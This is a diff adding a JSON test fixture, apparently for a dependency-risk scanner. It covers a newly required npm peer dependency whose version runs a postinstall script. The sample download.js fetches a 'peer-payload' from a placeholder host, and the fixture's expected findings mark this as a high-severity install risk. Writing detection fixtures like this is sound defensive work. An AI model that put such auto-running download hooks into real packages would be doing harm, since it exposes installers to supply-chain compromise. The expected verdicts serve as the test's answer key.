@@ -1,0 +1,64 @@
+{
+  "id": "added-required-peer-different-runtime-spec",
+  "title": "A newly required peer has a different spec from the existing runtime dependency",
+  "category": "dependency-introduction",
+  "intent": "npm can auto-install a required peer alongside a same-named nested runtime dependency. The existing name covers the peer only when its spec is the same.",
+  "previousPackageJson": {
+    "name": "component-parent",
+    "version": "1.0.0",
+    "dependencies": { "peer-helper": "^1.0.0" }
+  },
+  "stagedPackageJson": {
+    "name": "component-parent",
+    "version": "1.1.0",
+    "dependencies": { "peer-helper": "^1.0.0" },
+    "peerDependencies": { "peer-helper": "^2.0.0" }
+  },
+  "dependencyArtifacts": {
+    "peer-helper": {
+      "version": "2.0.0",
+      "packageJson": {
+        "name": "peer-helper",
+        "version": "2.0.0",
+        "scripts": { "postinstall": "node download.js" }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 107,
+          "sha256": "different-peer-package-json",
+          "flags": [],
+          "textSample": "{\"name\":\"peer-helper\",\"version\":\"2.0.0\",\"scripts\":{\"postinstall\":\"node download.js\"}}"
+        },
+        {
+          "path": "download.js",
+          "size": 55,
+          "sha256": "different-peer-downloader",
+          "flags": [],
+          "textSample": "fetch('https://cdn.example.invalid/peer-payload');\n"
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "peer-helper",
+      "section": "peerDependencies",
+      "declaredSpec": "^2.0.0",
+      "declarationKind": "range",
+      "status": "inspected",
+      "resolvedVersion": "2.0.0",
+      "verdict": "install-risk",
+      "automaticExecution": [{ "kind": "script", "name": "postinstall" }]
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency-artifact.install-risk",
+      "severity": "high",
+      "file": "<dependency>peer-helper@2.0.0:package.json"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedRecommendation": "block manual approval"
+}
